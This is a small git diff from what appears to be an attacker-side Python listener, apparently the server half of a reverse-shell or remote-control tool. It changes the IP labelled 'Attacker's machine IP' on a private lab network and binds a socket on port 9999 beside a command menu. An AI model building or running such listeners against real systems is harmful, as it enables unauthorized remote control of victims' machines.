@@ -36,7 +36,7 @@ def commands():
 		else:
 			print("You entered an invalid option!")
 
-ip = "192.168.10.129" #Attacker's machine IP
+ip = "192.168.10.100" #Attacker's machine IP
 port = 9999
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind((ip, port))
